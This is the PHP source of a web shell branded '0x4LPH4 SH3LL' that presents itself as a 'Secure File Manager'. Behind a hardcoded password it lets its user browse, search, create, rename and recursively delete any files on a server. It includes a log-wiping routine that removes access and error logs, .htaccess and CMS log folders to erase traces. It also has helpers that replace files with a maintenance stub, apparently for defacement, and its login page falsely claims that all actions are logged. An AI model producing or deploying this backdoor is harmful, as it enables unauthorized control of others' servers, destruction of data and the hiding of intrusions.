<?php
session_start();
// Prevent browser caching
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

// Store current scroll position before any redirect
if (isset($_SERVER['HTTP_REFERER']) && isset($_GET['path'])) {
    $_SESSION['last_path'] = $_GET['path'];
    $_SESSION['last_scroll'] = isset($_GET['scroll']) ? $_GET['scroll'] : 0;
}

/* ============================
   LOGIN SYSTEM
   ============================ */
$DEFAULT_PASS = "GeoDevz69";

// Logout
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_destroy();
    header("Location: ?");
    exit;
}

// Clear logs function
if (isset($_GET['clearlogs'])) {
    clearLogs();
    $_SESSION['toast'] = "Logs cleared successfully!";
    header("Location: ?" . getRedirectParams());
    exit;
}

function clearLogs() {
    $commonLogFiles = [
        'error_log', 'access_log', '.htaccess', 
        'logs.txt', 'log.txt', 'debug.log', 'error.log'
    ];
    
    $commonLogDirs = [
        'logs', 'log', 'tmp', 'temp', 'cache', 'debug'
    ];
    
    $cleared = [];
    
    // Clear common log files
    foreach ($commonLogFiles as $logFile) {
        if (file_exists($logFile)) {
            if (unlink($logFile)) {
                $cleared[] = $logFile;
            }
        }
        
        // Check in subdirectories
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator('.', RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getFilename() === $logFile) {
                if (unlink($file->getPathname())) {
                    $cleared[] = $file->getPathname();
                }
            }
        }
    }
    
    // Clear log directories
    foreach ($commonLogDirs as $logDir) {
        if (is_dir($logDir)) {
            deleteDirectory($logDir);
            $cleared[] = $logDir . '/';
        }
    }
    
    // Clear common CMS log directories
    $cmsLogDirs = [
        'wp-content/debug.log', 'wp-content/error_log',
        'storage/logs', 'var/log', 'app/logs'
    ];
    
    foreach ($cmsLogDirs as $cmsLog) {
        if (file_exists($cmsLog)) {
            if (is_dir($cmsLog)) {
                deleteDirectory($cmsLog);
            } else {
                unlink($cmsLog);
            }
            $cleared[] = $cmsLog;
        }
    }
    
    return $cleared;
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) return false;
    
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

// Helper function to get redirect parameters
function getRedirectParams() {
    $params = [];
    if (isset($_GET['path'])) {
        $params[] = 'path=' . rawurlencode($_GET['path']);
    }
    if (isset($_GET['search']) && $_GET['search'] !== '') {
        $params[] = 'search=' . rawurlencode($_GET['search']);
    }
    if (isset($_GET['scroll'])) {
        $params[] = 'scroll=' . intval($_GET['scroll']);
    }
    return !empty($params) ? implode('&', $params) : '';
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['password']) && $_POST['password'] === $DEFAULT_PASS) {
            session_regenerate_id(true);
            $_SESSION['logged_in'] = true;
            header("Location: ?");
            exit;
        } else {
            $error = "Wrong password!";
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>0x4LPH4 SH3LL - Login</title>
<style>
/* NEUMORPHIC 3D WHITE UI THEME */
:root {
  --white: #ffffff;
  --light-gray: #f0f0f3;
  --medium-gray: #d1d9e6;
  --dark-gray: #a3a3a3;
  --shadow-light: 8px 8px 16px #d1d9e6,
                 -8px -8px 16px #ffffff;
  --shadow-inset: inset 4px 4px 8px #d1d9e6,
                 inset -4px -4px 8px #ffffff;
  --shadow-pressed: 4px 4px 8px #d1d9e6,
                   -4px -4px 8px #ffffff;
  --shadow-deep: 12px 12px 24px #c8d0e7,
                -12px -12px 24px #ffffff;
  --primary: #6c5ce7;
  --primary-dark: #5b4bd8;
  --primary-light: #7d6de8;
  --error: #ff4757;
  --success: #00d2d3;
  --text-dark: #2d3436;
  --text-light: #636e72;
  --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
}

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html, body {
  height: 100%;
  font-family: 'Segoe UI', 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
  color: var(--text-dark);
  overflow: hidden;
  background: var(--light-gray);
}

/* 3D Background with subtle gradient */
body {
  background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  padding: 20px;
  position: relative;
  perspective: 1000px;
}

/* Background decorative elements */
.bg-element {
  position: fixed;
  border-radius: 50%;
  background: var(--white);
  box-shadow: var(--shadow-light);
  z-index: -1;
}

.bg-1 {
  width: 300px;
  height: 300px;
  top: -150px;
  right: -150px;
  opacity: 0.7;
}

.bg-2 {
  width: 200px;
  height: 200px;
  bottom: -100px;
  left: -100px;
  opacity: 0.5;
}

/* PERFECT SQUARE CARD - 480x480 */
.login-container {
  width: 480px;
  height: 480px;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  transform-style: preserve-3d;
  transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1);
}

.login-card {
  width: 100%;
  height: 100%;
  border-radius: 32px;
  background: var(--light-gray);
  box-shadow: var(--shadow-deep);
  padding: 48px 40px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  position: relative;
  overflow: hidden;
  transition: var(--transition);
  transform: translateZ(30px);
}

.login-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--primary), var(--success));
  border-radius: 32px 32px 0 0;
}

.login-card:hover {
  transform: translateZ(40px) rotateX(2deg) rotateY(2deg);
  box-shadow: 20px 20px 40px #c8d0e7,
             -20px -20px 40px #ffffff;
}

/* Logo - adjusted for square card */
.logo-container {
  width: 100px;
  height: 100px;
  margin: 0 auto 28px;
  position: relative;
}

.logo {
  width: 100%;
  height: 100%;
  border-radius: 25px;
  background: var(--light-gray);
  box-shadow: var(--shadow-light),
              inset 2px 2px 4px rgba(255, 255, 255, 0.8),
              inset -2px -2px 4px rgba(209, 217, 230, 0.6);
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  padding: 12px;
  transition: var(--transition);
}

.logo img {
  width: 100%;
  height: 100%;
  object-fit: contain;
  border-radius: 15px;
  filter: drop-shadow(2px 2px 4px rgba(0, 0, 0, 0.1));
}

/* Title styling */
.title {
  font-size: 28px;
  font-weight: 800;
  color: var(--text-dark);
  margin-bottom: 8px;
  text-align: center;
  letter-spacing: -0.5px;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.05);
}

.subtitle {
  font-size: 14px;
  color: var(--text-light);
  margin-bottom: 32px;
  text-align: center;
  font-weight: 500;
}

/* Error message */
.error-msg {
  color: var(--error);
  font-weight: 600;
  font-size: 14px;
  margin-bottom: 24px;
  padding: 12px 20px;
  background: rgba(255, 71, 87, 0.1);
  border-radius: 12px;
  text-align: center;
  width: 100%;
  animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
  box-shadow: var(--shadow-inset);
}

@keyframes shake {
  10%, 90% { transform: translateX(-1px); }
  20%, 80% { transform: translateX(2px); }
  30%, 50%, 70% { transform: translateX(-2px); }
  40%, 60% { transform: translateX(2px); }
}

/* Form styling */
.login-form {
  width: 100%;
  margin-top: 8px;
}

.input-group {
  position: relative;
  margin-bottom: 32px;
}

.input-label {
  display: block;
  font-size: 14px;
  color: var(--text-light);
  margin-bottom: 10px;
  font-weight: 600;
  padding-left: 4px;
}

.input-field {
  width: 100%;
  padding: 18px 24px;
  padding-right: 60px;
  border: none;
  border-radius: 20px;
  background: var(--light-gray);
  box-shadow: var(--shadow-inset);
  font-size: 16px;
  font-weight: 500;
  color: var(--text-dark);
  transition: var(--transition);
  font-family: inherit;
}

.input-field:focus {
  outline: none;
  box-shadow: inset 6px 6px 12px #d1d9e6,
              inset -6px -6px 12px #ffffff;
}

.input-field::placeholder {
  color: var(--dark-gray);
  font-weight: 500;
}

/* Password toggle button */
.toggle-btn {
  position: absolute;
  right: 16px;
  top: calc(50% + 5px);
  transform: translateY(-50%);
  background: transparent;
  border: none;
  width: 40px;
  height: 40px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  color: var(--text-light);
  transition: var(--transition);
  box-shadow: var(--shadow-light);
}

.toggle-btn:hover {
  background: var(--light-gray);
  box-shadow: var(--shadow-pressed);
  color: var(--primary);
}

.toggle-btn:active {
  transform: translateY(-50%) scale(0.95);
}

/* Button row */
.button-row {
  display: flex;
  gap: 16px;
  width: 100%;
  margin-top: 8px;
}

.btn {
  flex: 1;
  padding: 18px 0;
  border: none;
  border-radius: 20px;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  transition: var(--transition);
  font-family: inherit;
  letter-spacing: 0.5px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  position: relative;
  overflow: hidden;
}

.btn-primary {
  background: var(--light-gray);
  color: var(--primary);
  box-shadow: var(--shadow-light);
}

.btn-primary:hover {
  background: var(--light-gray);
  box-shadow: var(--shadow-pressed);
  transform: translateY(-2px);
  color: var(--primary-dark);
}

.btn-primary:active {
  transform: translateY(0);
  box-shadow: inset 4px 4px 8px #d1d9e6,
              inset -4px -4px 8px #ffffff;
}

.btn-secondary {
  background: var(--light-gray);
  color: var(--text-light);
  box-shadow: var(--shadow-light);
}

.btn-secondary:hover {
  background: var(--light-gray);
  box-shadow: var(--shadow-pressed);
  transform: translateY(-2px);
  color: var(--text-dark);
}

.btn-secondary:active {
  transform: translateY(0);
  box-shadow: inset 4px 4px 8px #d1d9e6,
              inset -4px -4px 8px #ffffff;
}

/* Ripple effect */
.btn::after {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  width: 5px;
  height: 5px;
  background: rgba(108, 92, 231, 0.3);
  opacity: 0;
  border-radius: 100%;
  transform: scale(1, 1) translate(-50%);
  transform-origin: 50% 50%;
}

.btn:focus:not(:active)::after {
  animation: ripple 1s ease-out;
}

@keyframes ripple {
  0% {
    transform: scale(0, 0);
    opacity: 0.5;
  }
  100% {
    transform: scale(20, 20);
    opacity: 0;
  }
}

/* Info text */
.info-text {
  font-size: 12px;
  color: var(--text-light);
  text-align: center;
  margin-top: 24px;
  line-height: 1.5;
  padding: 0 20px;
  opacity: 0.8;
}

/* 3D Tilt Effect */
.login-container.tilt {
  transform: rotateX(var(--tilt-y)) rotateY(var(--tilt-x)) scale(1.02);
}

/* Responsive adjustments */
@media (max-width: 520px) {
  .login-container {
    width: 380px;
    height: 380px;
  }
  
  .login-card {
    padding: 32px 28px;
    border-radius: 28px;
  }
  
  .logo-container {
    width: 80px;
    height: 80px;
    margin-bottom: 24px;
  }
  
  .title {
    font-size: 24px;
  }
  
  .input-field {
    padding: 16px 20px;
    padding-right: 56px;
  }
  
  .button-row {
    gap: 12px;
  }
  
  .btn {
    padding: 16px 0;
    font-size: 14px;
  }
}

@media (max-width: 400px) {
  .login-container {
    width: 340px;
    height: 340px;
  }
  
  .login-card {
    padding: 28px 24px;
    border-radius: 24px;
  }
  
  .logo-container {
    width: 70px;
    height: 70px;
    margin-bottom: 20px;
  }
  
  .title {
    font-size: 22px;
  }
  
  .input-field {
    padding: 14px 18px;
    padding-right: 52px;
  }
}

/* Performance optimizations */
* {
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  backface-visibility: hidden;
}

/* Remove tap highlight on mobile */
input, button {
  -webkit-tap-highlight-color: transparent;
}

/* Optimize animations */
@media (prefers-reduced-motion: reduce) {
  * {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}
</style>
</head>
<body>
<!-- Background elements -->
<div class="bg-element bg-1"></div>
<div class="bg-element bg-2"></div>

<div class="login-container" id="loginContainer">
  <div class="login-card">
    <div class="logo-container">
      <div class="logo">
        <img src="https://i.ibb.co/DDmnztxr/20251208-093450.png" alt="0x4LPH4 Logo">
      </div>
    </div>
    
    <h1 class="title">0x4LPH4 SH3LL</h1>
    <div class="subtitle">Secure File Manager Access</div>
    
    <?php if (isset($error)): ?>
    <div class="error-msg" role="alert"><?php echo htmlspecialchars($error, ENT_QUOTES); ?></div>
    <?php endif; ?>
    
    <form method="post" class="login-form" autocomplete="off">
      <div class="input-group">
        <label class="input-label">ENTER PASSWORD</label>
        <input type="password" 
               name="password" 
               class="input-field" 
               id="passwordInput"
               placeholder="••••••••" 
               required 
               autocomplete="off"
               autofocus>
        <button type="button" 
                class="toggle-btn" 
                id="togglePassword"
                aria-label="Toggle password visibility">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
        </button>
      </div>
      
      <div class="button-row">
        <button type="button" class="btn btn-secondary" id="keyBtn">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 11-7.778 7.778 5.5 5.5 0 017.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
          </svg>
          GET KEY
        </button>
        <button type="submit" class="btn btn-primary">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"></path>
            <circle cx="12" cy="7" r="4"></circle>
          </svg>
          LOGIN
        </button>
      </div>
      
      <div class="info-text">
        Use your admin password to access the file manager. All actions are logged.
      </div>
    </form>
  </div>
</div>

<script>
// Performance-optimized tilt effect
class TiltEffect {
  constructor(element) {
    this.element = element;
    this.settings = {
      max: 8,
      perspective: 1000,
      easing: "cubic-bezier(.03,.98,.52,.99)",
      scale: 1.02,
      speed: 800,
      transition: true
    };
    
    this.bounds = null;
    this.width = 0;
    this.height = 0;
    this.centerX = 0;
    this.centerY = 0;
    this.transitionTimeout = null;
    
    this.init();
  }
  
  init() {
    this.updateDimensions();
    this.element.addEventListener('mousemove', this.handleMouseMove.bind(this));
    this.element.addEventListener('mouseleave', this.handleMouseLeave.bind(this));
    window.addEventListener('resize', this.updateDimensions.bind(this));
  }
  
  updateDimensions() {
    this.bounds = this.element.getBoundingClientRect();
    this.width = this.bounds.width;
    this.height = this.bounds.height;
    this.centerX = this.width / 2;
    this.centerY = this.height / 2;
  }
  
  handleMouseMove(e) {
    if (this.transitionTimeout) {
      clearTimeout(this.transitionTimeout);
    }
    
    const x = e.clientX - this.bounds.left;
    const y = e.clientY - this.bounds.top;
    
    const rotateY = ((x - this.centerX) / this.centerX) * this.settings.max;
    const rotateX = ((this.centerY - y) / this.centerY) * this.settings.max;
    
    this.element.style.transform = `
      perspective(${this.settings.perspective}px)
      rotateX(${rotateX}deg)
      rotateY(${rotateY}deg)
      scale3d(${this.settings.scale}, ${this.settings.scale}, ${this.settings.scale})
    `;
    
    if (this.settings.transition) {
      this.element.style.transition = `transform ${this.settings.speed}ms ${this.settings.easing}`;
    }
  }
  
  handleMouseLeave() {
    if (this.transitionTimeout) {
      clearTimeout(this.transitionTimeout);
    }
    
    this.element.style.transition = `transform ${this.settings.speed}ms ${this.settings.easing}`;
    this.element.style.transform = `
      perspective(${this.settings.perspective}px)
      rotateX(0deg)
      rotateY(0deg)
      scale3d(1, 1, 1)
    `;
    
    this.transitionTimeout = setTimeout(() => {
      this.element.style.transition = '';
    }, this.settings.speed);
  }
}

// DOM Ready handler
document.addEventListener('DOMContentLoaded', () => {
  // Initialize tilt effect
  const container = document.getElementById('loginContainer');
  if (container) {
    new TiltEffect(container);
  }
  
  // Password toggle functionality
  const passwordInput = document.getElementById('passwordInput');
  const toggleBtn = document.getElementById('togglePassword');
  
  if (toggleBtn && passwordInput) {
    toggleBtn.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      
      // Update icon
      const icon = toggleBtn.querySelector('svg');
      if (icon) {
        if (type === 'text') {
          icon.innerHTML = `
            <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
          `;
        } else {
          icon.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          `;
        }
      }
    });
  }
  
  // Key button functionality
  const keyBtn = document.getElementById('keyBtn');
  if (keyBtn) {
    keyBtn.addEventListener('click', () => {
      // Create subtle feedback
      const btnBounds = keyBtn.getBoundingClientRect();
      const ripple = document.createElement('div');
      ripple.style.cssText = `
        position: fixed;
        width: 100px;
        height: 100px;
        border-radius: 50%;
        background: rgba(108, 92, 231, 0.1);
        transform: translate(-50%, -50%);
        pointer-events: none;
        z-index: 1000;
        animation: ripple 0.6s ease-out;
      `;
      
      document.body.appendChild(ripple);
      
      // Position ripple
      ripple.style.left = `${btnBounds.left + btnBounds.width / 2}px`;
      ripple.style.top = `${btnBounds.top + btnBounds.height / 2}px`;
      
      // Play sound if supported
      try {
        const audio = new Audio('https://cdn.pixabay.com/audio/2021/09/06/audio_730f0b5c79.mp3');
        audio.volume = 0.3;
        audio.play().catch(() => {});
      } catch (e) {}
      
      // Clean up ripple
      setTimeout(() => {
        ripple.remove();
      }, 600);
    });
  }
  
  // Add ripple effect to all buttons
  const buttons = document.querySelectorAll('.btn');
  buttons.forEach(btn => {
    btn.addEventListener('click', function(e) {
      const rect = this.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      
      const ripple = document.createElement('span');
      ripple.style.cssText = `
        position: absolute;
        border-radius: 50%;
        background: rgba(108, 92, 231, 0.3);
        transform: scale(0);
        animation: ripple 0.6s linear;
        pointer-events: none;
      `;
      
      const size = Math.max(rect.width, rect.height);
      ripple.style.width = ripple.style.height = `${size}px`;
      ripple.style.left = `${x - size / 2}px`;
      ripple.style.top = `${y - size / 2}px`;
      
      this.appendChild(ripple);
      
      setTimeout(() => {
        ripple.remove();
      }, 600);
    });
  });
  
  // Add CSS for ripple animation
  if (!document.querySelector('#ripple-style')) {
    const style = document.createElement('style');
    style.id = 'ripple-style';
    style.textContent = `
      @keyframes ripple {
        to {
          transform: scale(4);
          opacity: 0;
        }
      }
    `;
    document.head.appendChild(style);
  }
  
  // Form submission handling
  const form = document.querySelector('.login-form');
  if (form) {
    form.addEventListener('submit', () => {
      // Enable password field for submission
      if (passwordInput) {
        passwordInput.disabled = false;
      }
    });
  }
});

// Optimized resize handler with debouncing
let resizeTimeout;
window.addEventListener('resize', () => {
  clearTimeout(resizeTimeout);
  resizeTimeout = setTimeout(() => {
    // Reinitialize tilt effect if needed
    const container = document.getElementById('loginContainer');
    if (container && container._tiltEffect) {
      container._tiltEffect.updateDimensions();
    }
  }, 250);
});

// Prevent form submission on Enter key except for submit button
document.addEventListener('keydown', (e) => {
  if (e.key === 'Enter' && e.target.type !== 'submit') {
    e.preventDefault();
  }
});
</script>
</body>
</html>
<?php exit; }

/* ============================
   MAIN FILE MANAGER PAGE - NEUMORPHIC 3D WHITE UI
   ============================ */

$path = isset($_GET['path']) ? $_GET['path'] : '.';
$fullPath = realpath($path);
if ($fullPath === false) $fullPath = realpath('.');

// Search functionality
$searchTerm = isset($_GET['search']) ? trim($_GET['search']) : '';
$searchResults = [];

if ($searchTerm !== '') {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($fullPath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $filename = $file->getFilename();
            $filepath = $file->getPathname();
            
            // Search by extension or filename
            if (stripos($filename, $searchTerm) !== false || 
                stripos($filepath, $searchTerm) !== false ||
                (strpos($searchTerm, '.') === 0 && substr($filename, -strlen($searchTerm)) === $searchTerm)) {
                $searchResults[] = $filepath;
            }
        }
    }
}

/* ============================ CREATE FILE/FOLDER FUNCTIONALITY ============================ */
if (isset($_GET['create'])) {
    $type = $_GET['create']; // 'file' or 'folder'
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $name = trim($_POST['name']);
        if ($name === '') {
            $_SESSION['toast'] = "Name cannot be empty!";
            header("Location: ?" . getRedirectParams());
            exit;
        }
        
        $fullPath = $fullPath . DIRECTORY_SEPARATOR . $name;
        
        if ($type === 'file') {
            if (file_exists($fullPath)) {
                $_SESSION['toast'] = "File already exists!";
            } elseif (touch($fullPath)) {
                $_SESSION['toast'] = "File created successfully!✅";
            } else {
                $_SESSION['toast'] = "Failed to create file!";
            }
        } elseif ($type === 'folder') {
            if (file_exists($fullPath)) {
                $_SESSION['toast'] = "Folder already exists!";
            } elseif (mkdir($fullPath, 0755, true)) {
                $_SESSION['toast'] = "Folder created successfully!✅";
            } else {
                $_SESSION['toast'] = "Failed to create folder!";
            }
        }
        
        header("Location: ?" . getRedirectParams());
        exit;
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Create <?php echo htmlspecialchars($type,ENT_QUOTES); ?></title>
<style>
/* NEUMORPHIC 3D WHITE UI */
:root {
  --white: #ffffff;
  --light-gray: #f0f0f3;
  --medium-gray: #d1d9e6;
  --shadow-light: 8px 8px 16px #d1d9e6,
                 -8px -8px 16px #ffffff;
  --shadow-inset: inset 4px 4px 8px #d1d9e6,
                 inset -4px -4px 8px #ffffff;
  --primary: #6c5ce7;
  --text-dark: #2d3436;
}

*{box-sizing:border-box}
html, body {
  height: 100%;
  margin: 0;
  font-family: 'Segoe UI', -apple-system, sans-serif;
  color: var(--text-dark);
  background: var(--light-gray);
  display: flex;
  align-items: center;
  justify-content: center;
}

.container {
  width: 480px;
  max-width: 90%;
}

.card{
  border-radius: 28px;
  padding: 40px;
  background: var(--light-gray);
  box-shadow: 20px 20px 40px #d1d9e6,
             -20px -20px 40px #ffffff;
  position: relative;
  overflow: hidden;
}

.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--primary), #00d2d3);
  border-radius: 28px 28px 0 0;
}

h2{
  margin: 0 0 28px 0;
  color: var(--text-dark);
  font-size: 24px;
  font-weight: 700;
  text-align: center;
}

input[type=text]{
  width: 100%;
  padding: 18px 24px;
  border-radius: 20px;
  border: none;
  margin-bottom: 24px;
  font-weight: 500;
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-inset);
  outline: none;
  font-size: 16px;
  transition: all 0.3s ease;
}

input[type=text]:focus{
  box-shadow: inset 6px 6px 12px #d1d9e6,
              inset -6px -6px 12px #ffffff;
}

.btn-group {
  display: flex;
  gap: 16px;
  margin-top: 8px;
}

.btn{
  flex: 1;
  padding: 16px 24px;
  border-radius: 20px;
  border: none;
  font-weight: 700;
  text-decoration: none;
  font-family: inherit;
  cursor: pointer;
  transition: all 0.3s ease;
  font-size: 15px;
  text-align: center;
}

.btn-primary{
  background: var(--light-gray);
  color: var(--primary);
  box-shadow: var(--shadow-light);
}

.btn-primary:hover{
  box-shadow: 4px 4px 8px #d1d9e6,
             -4px -4px 8px #ffffff;
  transform: translateY(-2px);
}

.btn-secondary{
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-light);
}

.btn-secondary:hover{
  box-shadow: 4px 4px 8px #d1d9e6,
             -4px -4px 8px #ffffff;
  transform: translateY(-2px);
}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h2>Create <?php echo htmlspecialchars(ucfirst($type),ENT_QUOTES); ?></h2>
    <form method="post">
      <input type="text" name="name" placeholder="Enter <?php echo htmlspecialchars($type,ENT_QUOTES); ?> name" required autofocus>
      <div class="btn-group">
        <button class="btn btn-primary" type="submit">Create</button>
        <a href="?<?php echo getRedirectParams(); ?>" class="btn btn-secondary">Cancel</a>
      </div>
    </form>
  </div>
</div>
</body>
</html>
<?php exit; }

/* ============================ LOCK / UNLOCK HELPERS ============================ */
function lock_target_path($target) {
    $dir = dirname($target);
    $base = basename($target);
    $abs = $dir . DIRECTORY_SEPARATOR . $base;
    return $abs;
}
function make_backup_name($abs) {
    return $abs . '.locked.bak';
}
function is_locked_backup_present($abs) {
    return file_exists(make_backup_name($abs));
}
function create_lock_stub_text($abs) {
    $ext = strtolower(pathinfo($abs, PATHINFO_EXTENSION));
    if ($ext === 'txt') {
        return "Maintenance....Coming Soon!";
    }
    return "Maintenance....Coming Soon!";
}

/* Breadcrumb */
$parts = explode(DIRECTORY_SEPARATOR, $fullPath);
$breadcrumb = "";
$build = "";
foreach ($parts as $p) {
    if ($p === "") continue;
    $build .= DIRECTORY_SEPARATOR . $p;
    $escapedBuildForJs = htmlspecialchars(addslashes($build), ENT_QUOTES);
    $breadcrumb .= "<a href='?" . getRedirectParamsForLink($build) . "' onclick=\"setPath('".$escapedBuildForJs."')\">" . htmlspecialchars($p, ENT_QUOTES) . "</a> / ";
}

// Helper function for breadcrumb links
function getRedirectParamsForLink($newPath) {
    $params = ['path=' . rawurlencode($newPath)];
    if (isset($_GET['search']) && $_GET['search'] !== '') {
        $params[] = 'search=' . rawurlencode($_GET['search']);
    }
    if (isset($_GET['scroll'])) {
        $params[] = 'scroll=' . intval($_GET['scroll']);
    }
    return implode('&', $params);
}

/* DELETE - FIXED: Now properly deletes folders */
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
    } elseif (is_dir($target)) {
        // Use recursive delete function for directories
        deleteDirectory($target);
    }
    $_SESSION['toast'] = "Deleted successfully!✅";
    header("Location: ?" . getRedirectParams());
    exit;
}

/* RENAME */
if (isset($_GET['rename'])) {
    $renameFile = $_GET['rename'];

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = dirname($renameFile) . "/" . $_POST['newname'];
        rename($renameFile, $newName);
        $_SESSION['toast'] = "Renamed successfully!✅";
        header("Location: ?" . getRedirectParams());
        exit;
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Rename - <?php echo htmlspecialchars(basename($renameFile),ENT_QUOTES); ?></title>
<style>
/* NEUMORPHIC 3D WHITE UI */
:root {
  --white: #ffffff;
  --light-gray: #f0f0f3;
  --medium-gray: #d1d9e6;
  --shadow-light: 8px 8px 16px #d1d9e6,
                 -8px -8px 16px #ffffff;
  --shadow-inset: inset 4px 4px 8px #d1d9e6,
                 inset -4px -4px 8px #ffffff;
  --primary: #6c5ce7;
  --text-dark: #2d3436;
}

*{box-sizing:border-box}
html, body {
  height: 100%;
  margin: 0;
  font-family: 'Segoe UI', -apple-system, sans-serif;
  color: var(--text-dark);
  background: var(--light-gray);
  display: flex;
  align-items: center;
  justify-content: center;
}

.container {
  width: 480px;
  max-width: 90%;
}

.card{
  border-radius: 28px;
  padding: 40px;
  background: var(--light-gray);
  box-shadow: 20px 20px 40px #d1d9e6,
             -20px -20px 40px #ffffff;
  position: relative;
  overflow: hidden;
}

.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--primary), #00d2d3);
  border-radius: 28px 28px 0 0;
}

h2{
  margin: 0 0 28px 0;
  color: var(--text-dark);
  font-size: 24px;
  font-weight: 700;
  text-align: center;
}

input[type=text]{
  width: 100%;
  padding: 18px 24px;
  border-radius: 20px;
  border: none;
  margin-bottom: 24px;
  font-weight: 500;
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-inset);
  outline: none;
  font-size: 16px;
  transition: all 0.3s ease;
}

input[type=text]:focus{
  box-shadow: inset 6px 6px 12px #d1d9e6,
              inset -6px -6px 12px #ffffff;
}

.btn-group {
  display: flex;
  gap: 16px;
  margin-top: 8px;
}

.btn{
  flex: 1;
  padding: 16px 24px;
  border-radius: 20px;
  border: none;
  font-weight: 700;
  text-decoration: none;
  font-family: inherit;
  cursor: pointer;
  transition: all 0.3s ease;
  font-size: 15px;
  text-align: center;
}

.btn-primary{
  background: var(--light-gray);
  color: var(--primary);
  box-shadow: var(--shadow-light);
}

.btn-primary:hover{
  box-shadow: 4px 4px 8px #d1d9e6,
             -4px -4px 8px #ffffff;
  transform: translateY(-2px);
}

.btn-secondary{
  background: var(--light-gray);
  color: var(--text-dark);
  box-shadow: var(--shadow-light);
}

.btn-secondary:hover{
  box-shadow: 4px 4px 8px #d1d9e6,
             -4px -4px 8px #ffffff;
  transform: translateY(-2px);
}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h2>Rename: <?php echo htmlspecialchars(basename($renameFile),ENT_QUOTES); ?></h2>
    <form method="post">
      <input type="text" name="newname" value="<?php echo htmlspecialchars(basename($renameFile),ENT_QUOTES); ?>" required>
      <div class="btn-group">
        <button class="btn btn-primary" type="submit">Rename</button>
        <a href="?<?php echo getRedirectParams(); ?>" class="btn btn-secondary">Cancel</a>
      </div>
    </form>
  </div>
</div>
</body>
</html>
<?php exit; }

/* LOCK - FIXED VERSION */
